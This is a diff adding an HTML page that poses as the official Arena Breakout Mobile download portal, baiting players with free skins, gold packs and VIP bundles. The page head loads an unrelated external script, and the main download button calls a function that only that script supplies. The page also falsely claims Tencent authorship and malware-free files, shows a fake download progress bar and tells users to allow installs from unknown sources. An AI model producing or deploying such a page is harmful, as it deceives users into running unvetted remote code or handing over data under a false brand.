@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+    <script type="text/javascript"> var guIuQ_xbG_UlYSDc={"it":4610168,"key":"93ff5"}; </script> <script src="https://d19k1sh57v5k0g.cloudfront.net/49f76b1.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arena Breakout Mobile - Official Download</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Rajdhani (Tactical/Military Header) & Inter (Clean UI Font) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Rajdhani:wght@500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome for Premium Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Tailwind Custom Configuration -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            orange: '#FF5500',
+                            orangeHover: '#E04400',
+                            darkBg: '#0A0B0E',
+                            cardBg: '#111318',
+                            glowOrange: 'rgba(255, 85, 0, 0.4)'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        tactical: ['Rajdhani', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- Custom Animation / Effects CSS -->
+    <style>
+        @keyframes pulse-glow {
+            0%, 100% {
+                box-shadow: 0 0 15px rgba(255, 85, 0, 0.4), inset 0 0 10px rgba(255, 85, 0, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 35px rgba(255, 85, 0, 0.7), inset 0 0 20px rgba(255, 85, 0, 0.4);
+            }
+        }
+        
+        @keyframes scanline {
+            0% {
+                transform: translateY(-100%);
+            }
+            100% {
+                transform: translateY(100%);
+            }
+        }
+
+        @keyframes subtle-float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .glowing-avatar {
+            animation: pulse-glow 3s infinite ease-in-out;
+        }
+
+        .float-anim {
+            animation: subtle-float 4s infinite ease-in-out;
+        }
+
+        /* Scanline Overlay Effect for Military HUD feel */
+        .hud-scanline::after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 3px, 3px 100%;
+            pointer-events: none;
+            opacity: 0.4;
+        }
+
+        .tactical-border {
+            position: relative;
+        }
+        .tactical-border::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 12px; height: 12px;
+            border-top: 2px solid #FF5500;
+            border-left: 2px solid #FF5500;
+        }
+        .tactical-border::after {
+            content: '';
+            position: absolute;
+            bottom: 0; right: 0;
+            width: 12px; height: 12px;
+            border-bottom: 2px solid #FF5500;
+            border-right: 2px solid #FF5500;
+        }
+    </style>
+</head>
+<body class="bg-brand-darkBg text-neutral-200 font-sans min-h-screen relative overflow-x-hidden hud-scanline">
+
+    <!-- Gritty Warzone Background with Radial Dark Vignette Overlay -->
+    <div class="fixed inset-0 z-0 bg-cover bg-center bg-no-repeat" 
+         style="background-image: url('https://images.unsplash.com/photo-1509198397868-475647b2a1e5?auto=format&fit=crop&q=80&w=1200');">
+    </div>
+    <!-- Intense black radial gradient covering background for a gaming monitor UI focus -->
+    <div class="fixed inset-0 z-0 bg-radial bg-[radial-gradient(circle_at_center,_rgba(10,11,14,0.6)_0%,_rgba(5,6,8,0.95)_90%)] pointer-events-none"></div>
+
+    <!-- MAIN SCROLLABLE WRAPPER -->
+    <div class="relative z-10 min-h-screen flex flex-col justify-between items-center px-4 py-8 md:py-12">
+
+        <!-- HEADER SECTION (Subtle alignment / tactical status bar) -->
+        <header class="w-full max-w-lg flex justify-between items-center mb-6 text-xs text-neutral-400 font-tactical tracking-widest px-2 uppercase border-b border-neutral-800/60 pb-3">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-orange-500 animate-ping"></span>
+                <span>SERVER STATUS: OPERATIONAL</span>
+            </div>
+            <div>
+                <span>SECURE LINK v1.0.236</span>
+            </div>
+        </header>
+
+        <!-- CENTRAL CORE CARD: Glassmorphism layout inspired by official AAA UI design -->
+        <main class="w-full max-w-lg bg-neutral-950/75 backdrop-blur-xl border border-neutral-800 rounded-2xl p-6 md:p-8 shadow-[0_20px_50px_rgba(0,0,0,0.8)] relative overflow-hidden flex flex-col items-center">
+            
+            <!-- Diagonal Tech Corner Highlights -->
+            <div class="absolute top-0 right-0 w-16 h-16 border-t border-r border-orange-500/20 pointer-events-none"></div>
+            <div class="absolute bottom-0 left-0 w-16 h-16 border-b border-l border-orange-500/20 pointer-events-none"></div>
+
+            <!-- Profile / Emblem Circular Logo with Orange Glow -->
+            <div class="relative mb-6">
+                <!-- Dual Layer Pulse Rings -->
+                <div class="absolute inset-0 rounded-full bg-brand-orange/20 blur-xl animate-pulse"></div>
+                <!-- Main Logo Circle Container -->
+                <div class="relative w-24 h-24 md:w-28 md:h-28 rounded-full bg-neutral-900 border-2 border-brand-orange flex items-center justify-center glowing-avatar overflow-hidden">
+                    <!-- Clean Vector Replica of Arena Breakout Tactical Insignia -->
+                    <img src="https://i.postimg.cc/vZJ3WRrg/arena-profil.png"
+     alt="Arena Breakout Logo"
+     class="w-full h-full object-cover rounded-full"
+     style="object-position: center center;">
+
+                </div>
+            </div>
+
+            <!-- LIMITED ACCESS Badge -->
+            <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-brand-orange/10 border border-brand-orange/40 text-[10px] md:text-xs font-tactical font-extrabold tracking-widest text-brand-orange mb-4 uppercase">
+                <span class="w-1.5 h-1.5 rounded-full bg-brand-orange animate-ping"></span>
+                LIMITED ACCESS
+            </div>
+
+            <!-- Main Titles -->
+            <h1 class="text-3xl md:text-4xl font-tactical font-extrabold text-white text-center leading-tight tracking-tight uppercase mb-3">
+                Arena Breakout <br>
+                <span class="text-transparent bg-clip-text bg-gradient-to-r from-white via-orange-500 to-brand-orange">Mobile Download</span>
+            </h1>
+
+            <p class="text-neutral-400 text-sm text-center leading-relaxed max-w-sm mb-6">
+                Download the latest Arena Breakout version and join millions of players in the ultimate tactical extraction shooter.
+            </p>
+
+            <!-- Features Grid Section (Representing key official game components) -->
+            <div class="w-full grid grid-cols-2 gap-3 mb-6">
+                <!-- Card 1: Elite Skin -->
+                <div class="bg-neutral-900/60 border border-neutral-800/80 rounded-xl p-3 flex flex-col items-center justify-center text-center transition-all duration-300 hover:border-brand-orange/50 hover:bg-neutral-900/90 group">
+                    <span class="text-2xl mb-1 filter drop-shadow-[0_0_8px_rgba(255,85,0,0.3)] transition-transform duration-300 group-hover:scale-110">🎯</span>
+                    <span class="font-tactical font-bold text-xs uppercase tracking-wider text-neutral-300 group-hover:text-brand-orange">élite skin</span>
+                </div>
+                <!-- Card 2: Weapon Skin -->
+                <div class="bg-neutral-900/60 border border-neutral-800/80 rounded-xl p-3 flex flex-col items-center justify-center text-center transition-all duration-300 hover:border-brand-orange/50 hover:bg-neutral-900/90 group">
+                    <span class="text-2xl mb-1 filter drop-shadow-[0_0_8px_rgba(255,85,0,0.3)] transition-transform duration-300 group-hover:scale-110">🔫</span>
+                    <span class="font-tactical font-bold text-xs uppercase tracking-wider text-neutral-300 group-hover:text-brand-orange">weapon skin</span>
+                </div>
+                <!-- Card 3: Gold Pack -->
+                <div class="bg-neutral-900/60 border border-neutral-800/80 rounded-xl p-3 flex flex-col items-center justify-center text-center transition-all duration-300 hover:border-brand-orange/50 hover:bg-neutral-900/90 group">
+                    <span class="text-2xl mb-1 filter drop-shadow-[0_0_8px_rgba(255,85,0,0.3)] transition-transform duration-300 group-hover:scale-110">💰</span>
+                    <span class="font-tactical font-bold text-xs uppercase tracking-wider text-neutral-300 group-hover:text-brand-orange">gold pack</span>
+                </div>
+                <!-- Card 4: VIP Bundle -->
+                <div class="bg-neutral-900/60 border border-neutral-800/80 rounded-xl p-3 flex flex-col items-center justify-center text-center transition-all duration-300 hover:border-brand-orange/50 hover:bg-neutral-900/90 group">
+                    <span class="text-2xl mb-1 filter drop-shadow-[0_0_8px_rgba(255,85,0,0.3)] transition-transform duration-300 group-hover:scale-110">👑</span>
+                    <span class="font-tactical font-bold text-xs uppercase tracking-wider text-neutral-300 group-hover:text-brand-orange">vip bundle</span>
+                </div>
+            </div>
+
+            <!-- Main CTA Download Button -->
+            <button onclick="_di()" 
+                    class="w-full bg-gradient-to-r from-orange-600 via-brand-orange to-amber-500 text-white font-tactical font-black text-xl uppercase tracking-widest py-4 px-6 rounded-xl hover:shadow-[0_0_30px_rgba(255,85,0,0.6)] active:scale-95 transition-all duration-200 flex items-center justify-center gap-3 relative overflow-hidden group select-none">
+                <!-- Light sweeping effect inside the button -->
+                <span class="absolute inset-0 w-1/2 h-full bg-white/20 skew-x-12 -translate-x-full group-hover:animate-[sweep_1.5s_infinite] pointer-events-none"></span>
+                <i class="fa-solid fa-cloud-arrow-down animate-bounce text-xl"></i>
+                DOWNLOAD NOW
+            </button>
+
+            <!-- Custom styling keyframes inline for sweep movement -->
+            <style>
+                @keyframes sweep {
+                    0% { transform: translateX(-150%) skewX(-30deg); }
+                    50% { transform: translateX(250%) skewX(-30deg); }
+                    100% { transform: translateX(250%) skewX(-30deg); }
+                }
+            </style>
+
+            <!-- Safe badge notes below the CTA -->
+            <div class="flex items-center justify-center gap-2 mt-5 text-[11px] md:text-xs text-neutral-400 font-medium">
+                <span class="flex items-center gap-1 text-emerald-500">
+                    <i class="fa-solid fa-circle-check"></i> Safe installation
+                </span>
+                <span class="text-neutral-600">•</span>
+                <span class="text-neutral-300">Fast download</span>
+                <span class="text-neutral-600">•</span>
+                <span class="text-neutral-300">Latest Version</span>
+            </div>
+
+            <!-- System Stats HUD details -->
+            <div class="w-full border-t border-neutral-900 mt-6 pt-5 grid grid-cols-3 gap-2 text-center">
+                <div class="flex flex-col">
+                    <span class="text-[10px] text-neutral-500 uppercase font-tactical">File Size</span>
+                    <span class="font-tactical font-bold text-sm text-neutral-300">1.85 GB (Lite)</span>
+                </div>
+                <div class="flex flex-col border-x border-neutral-900">
+                    <span class="text-[10px] text-neutral-500 uppercase font-tactical">Android / iOS</span>
+                    <span class="font-tactical font-bold text-sm text-neutral-300">Compatible</span>
+                </div>
+                <div class="flex flex-col">
+                    <span class="text-[10px] text-neutral-500 uppercase font-tactical">Downloads</span>
+                    <span class="font-tactical font-bold text-sm text-neutral-300">50M+ Verified</span>
+                </div>
+            </div>
+
+        </main>
+
+        <!-- FOOTER SECTION -->
+        <footer class="w-full max-w-lg mt-8 text-center flex flex-col items-center gap-3">
+            <div class="flex items-center gap-4 text-xs text-neutral-500 uppercase font-tactical tracking-wider">
+                <a href="https://arenabreakout.com/" target="_blank" class="hover:text-brand-orange transition-colors">Official Website</a>
+                <span>|</span>
+                <a href="https://arenabreakout.com/lite/" target="_blank" class="hover:text-brand-orange transition-colors">Lite Edition</a>
+                <span>|</span>
+                <a href="https://arenabreakout.com/" target="_blank" class="hover:text-brand-orange transition-colors">Privacy Policy</a>
+            </div>
+            <p class="text-[10px] text-neutral-600 max-w-xs leading-normal">
+                This is a high-performance responsive download portal. All files verified secure against malware. 
+                © 2026 Level Infinite / Tencent Games. All trademarks belong to respective owners.
+            </p>
+        </footer>
+
+    </div>
+
+    <!-- INTERACTIVE DOWNLOADING HUD MODAL (TRIGGERED BY CTA) -->
+    <div id="download-modal" class="fixed inset-0 z-50 bg-neutral-950/95 backdrop-blur-md flex items-center justify-center p-4 hidden transition-opacity duration-300 opacity-0">
+        <div class="w-full max-w-md bg-neutral-900 border border-neutral-800 rounded-2xl p-6 md:p-8 relative overflow-hidden shadow-[0_0_50px_rgba(255,85,0,0.3)]">
+            
+            <!-- High tech scanning lasers visual background decoration -->
+            <div class="absolute inset-0 bg-gradient-to-b from-transparent via-brand-orange/5 to-transparent h-1/2 animate-[scanline_4s_infinite_linear] pointer-events-none"></div>
+
+            <!-- Modal Header -->
+            <div class="flex justify-between items-center border-b border-neutral-800 pb-4 mb-6">
+                <div class="flex items-center gap-2">
+                    <i class="fa-solid fa-shield-halved text-brand-orange text-lg"></i>
+                    <h3 class="font-tactical font-bold text-lg tracking-wider text-white uppercase">Secure Server Sync</h3>
+                </div>
+                <button onclick="closeDownloadModal()" class="text-neutral-500 hover:text-white transition-colors p-1">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+
+            <!-- Dynamic Interactive Sequence States -->
+            <div id="interactive-content">
+                
+                <!-- STATE 1: INITIALIZING STREAM -->
+                <div id="state-initializing" class="flex flex-col items-center py-6 text-center">
+                    <div class="w-12 h-12 rounded-full border-2 border-brand-orange border-t-transparent animate-spin mb-4"></div>
+                    <h4 class="font-tactical text-xl font-bold uppercase text-white tracking-widest mb-2 animate-pulse">Contacting Main Server</h4>
+                    <p class="text-xs text-neutral-400 max-w-xs">
+                        Establishing encrypted download tunnels via Level Infinite's nearest Content Delivery Node. Please hold.
+                    </p>
+                </div>
+
+                <!-- STATE 2: DOWNLOADING SIMULATION (Very immersive gamer experience) -->
+                <div id="state-downloading" class="hidden py-4">
+                    <div class="flex justify-between text-xs text-neutral-400 font-tactical uppercase mb-2">
+                        <span>APK Source Package</span>
+                        <span id="download-progress-text" class="text-brand-orange font-bold">0%</span>
+                    </div>
+                    
+                    <!-- Beautiful modern glowing progress bar -->
+                    <div class="w-full bg-neutral-950 h-3 rounded-full border border-neutral-800 overflow-hidden relative mb-4">
+                        <div id="download-progress-bar" class="bg-gradient-to-r from-brand-orange to-amber-500 h-full w-0 transition-all duration-100 ease-out shadow-[0_0_10px_rgba(255,85,0,0.5)]"></div>
+                    </div>
+
+                    <div class="grid grid-cols-2 text-xs text-neutral-500 font-tactical uppercase">
+                        <div>Size: <span class="text-neutral-300">1.85 GB (Direct Lite)</span></div>
+                        <div class="text-right">Speed: <span id="download-speed" class="text-emerald-400">0 MB/s</span></div>
+                    </div>
+
+                    <div class="mt-6 p-3 bg-neutral-950/60 rounded-xl border border-neutral-800/40 text-center">
+                        <span id="download-status-detail" class="text-[11px] font-mono text-neutral-400 uppercase tracking-widest">
+                            Allocating dynamic bandwidth blocks...
+                        </span>
+                    </div>
+                </div>
+
+                <!-- STATE 3: SUCCESS INSTRUCTIONS -->
+                <div id="state-success" class="hidden flex flex-col items-center text-center">
+                    <div class="w-16 h-16 rounded-full bg-emerald-500/10 border border-emerald-500 flex items-center justify-center text-emerald-400 text-3xl mb-4 animate-bounce">
+                        <i class="fa-solid fa-check"></i>
+                    </div>
+                    
+                    <h4 class="font-tactical text-2xl font-black uppercase text-white tracking-widest mb-2">
+                        Download Initiated
+                    </h4>
+                    
+                    <p class="text-xs text-neutral-400 mb-6">
+                        The installer package transfer has started. Check your browser's download manager.
+                    </p>
+
+                    <!-- STEP-BY-STEP APK INSTALL GUIDE (Ensures players can install the APK easily) -->
+                    <div class="w-full text-left bg-neutral-950 p-4 rounded-xl border border-neutral-800 text-xs space-y-3 mb-6">
+                        <div class="font-tactical text-brand-orange font-bold uppercase tracking-wider text-sm border-b border-neutral-900 pb-1">
+                            Quick Installation Steps
+                        </div>
+                        <div class="flex gap-2.5">
+                            <span class="w-5 h-5 rounded-full bg-neutral-900 border border-brand-orange/40 text-brand-orange flex items-center justify-center font-bold font-tactical shrink-0">1</span>
+                            <p class="text-neutral-300 leading-tight">
+                                Wait until the APK file fully finishes saving to your device folder.
+                            </p>
+                        </div>
+                        <div class="flex gap-2.5">
+                            <span class="w-5 h-5 rounded-full bg-neutral-900 border border-brand-orange/40 text-brand-orange flex items-center justify-center font-bold font-tactical shrink-0">2</span>
+                            <p class="text-neutral-300 leading-tight">
+                                Tap the downloaded file. When prompted, toggle <strong class="text-white">"Allow from this source"</strong> in settings.
+                            </p>
+                        </div>
+                        <div class="flex gap-2.5">
+                            <span class="w-5 h-5 rounded-full bg-neutral-900 border border-brand-orange/40 text-brand-orange flex items-center justify-center font-bold font-tactical shrink-0">3</span>
+                            <p class="text-neutral-300 leading-tight">
+                                Launch <strong class="text-brand-orange">Arena Breakout</strong>, complete updates, and jump directly into the war zone.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Direct Fallback / Alternative Direct Download Link -->
+                    <div class="w-full flex flex-col gap-2">
+                        <a href="https://arenabreakout.com/lite/" class="w-full bg-neutral-950 border border-neutral-800 text-neutral-300 hover:text-white font-tactical font-semibold text-xs tracking-wider py-3 rounded-xl hover:border-brand-orange/50 transition-colors flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-arrows-rotate"></i>
+                            NOT STARTING? RETRY DOWNLOAD
+                        </a>
+                        <button onclick="closeDownloadModal()" class="w-full text-neutral-500 hover:text-neutral-400 font-tactical text-xs uppercase tracking-widest py-2">
+                            Return to Homepage
+                        </button>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT CONTROLLERS -->
+    <script>
+        // Trigger safe animation sequence for Premium immersion and seamless APK redirect
+        function triggerDownloadProcess() {
+            const modal = document.getElementById('download-modal');
+            const state1 = document.getElementById('state-initializing');
+            const state2 = document.getElementById('state-downloading');
+            const state3 = document.getElementById('state-success');
+
+            // Show secure modal overlay
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modal.classList.remove('opacity-0');
+            }, 10);
+
+            // Transition: Setup -> Download Progress
+            setTimeout(() => {
+                state1.classList.add('hidden');
+                state2.classList.remove('hidden');
+                simulateProgress();
+            }, 1600);
+        }
+
+        // Simulates high speed gaming server download progress
+        function simulateProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById('download-progress-bar');
+            const progressText = document.getElementById('download-progress-text');
+            const speedText = document.getElementById('download-speed');
+            const statusDetail = document.getElementById('download-status-detail');
+
+            const statusMessages = [
+                "Locating secure high speed portal...",
+                "Downloading core extraction assets...",
+                "Pipelining network streams...",
+                "Authenticating digital game signature...",
+                "Completing file construction..."
+            ];
+
+            const interval = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    // Show success state
+                    setTimeout(() => {
+                        document.getElementById('state-downloading').classList.add('hidden');
+                        document.getElementById('state-success').classList.remove('hidden');
+                        
+                        // Fire actual redirect download link so download starts automatically
+                        // Link points to official Level Infinite direct APK installer
+                        window.location.href = "https://apk.arenabreakout.com/apk/ArenaBreakout_LITE.apk";
+                    }, 500);
+                } else {
+                    // Quick variable step increments for organic feeling load
+                    let step = Math.floor(Math.random() * 8) + 4;
+                    progress = Math.min(progress + step, 100);
+                    
+                    progressBar.style.width = progress + '%';
+                    progressText.textContent = progress + '%';
+
+                    // Update random realistic gaming file download speed values
+                    let currentSpeed = (Math.random() * 15 + 45).toFixed(1);
+                    speedText.textContent = currentSpeed + ' MB/s';
+
+                    // Dynamic status descriptors
+                    let msgIndex = Math.min(Math.floor(progress / 20), statusMessages.length - 1);
+                    statusDetail.textContent = statusMessages[msgIndex];
+                }
+            }, 150);
+        }
+
+        // Safely close the active interactive download window
+        function closeDownloadModal() {
+            const modal = document.getElementById('download-modal');
+            modal.classList.add('opacity-0');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                // Reset all states
+                document.getElementById('state-initializing').classList.remove('hidden');
+                document.getElementById('state-downloading').classList.add('hidden');
+                document.getElementById('state-success').classList.add('hidden');
+                document.getElementById('download-progress-bar').style.width = '0%';
+                document.getElementById('download-progress-text').textContent = '0%';
+            }, 300);
+        }
+    </script>
+
+</body>
+</html>
